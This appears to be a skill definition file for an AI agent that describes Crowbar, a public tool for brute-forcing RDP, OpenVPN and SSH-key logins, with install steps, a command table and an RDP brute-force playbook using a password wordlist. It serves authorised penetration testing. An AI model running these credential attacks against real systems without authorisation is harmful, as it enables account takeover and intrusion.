---
name: crowbar-brute
description: "Crowbar: Brute-forces RDP passwords. Signals: password cracking, hash cracking, RDP brute force, private key brute force, OpenVPN brute force."
zh-signals: "Crowbar: RDP 口令爆破。信号:密码破解,哈希破解,RDP 爆破,私钥撞库,OpenVPN 爆破。"
when-to-use: "Use Crowbar when brute-forcing RDP, OpenVPN, SSH private keys, or other supported protocols with credential dictionaries during an authorized password attack."
---

# Crowbar

- Attack Category: C25 Password and Hash Cracking
- Upstream Repository: https://github.com/galkan/crowbar
- Upstream License: MIT (this SKILL.md is re-released under Apache-2.0; upstream copyright belongs to the original project)

## Installation

```bash
git clone https://github.com/galkan/crowbar && cd crowbar
```

## Parameter Quick Reference

| Parameter / Command | Description |
| --- | --- |
| `crowbar -b rdp -s 10.0.0.5/32 -u admin -C pass.txt` | RDP brute force |
| `crowbar -b sshkey -s 10.0.0.0/24 -U users.txt -K keys/` | Private key brute force |
| `crowbar -b vpn -s 10.0.0.1 -p 443 -u user -C pass.txt` | OpenVPN brute force |
| `-b svn / -b mysql` | Other protocols |
| `-v` | Verbose output |

## Attack Scenario Playbook

### RDP Password Brute Force

```bash
crowbar -b rdp -s 10.0.0.5 -u administrator -C rockyou.txt
# A hit yields an RDP session immediately
```

## Notes

Its distinguishing feature is bulk credential stuffing with SSH private keys (private key + username wordlist), which few other tools support.
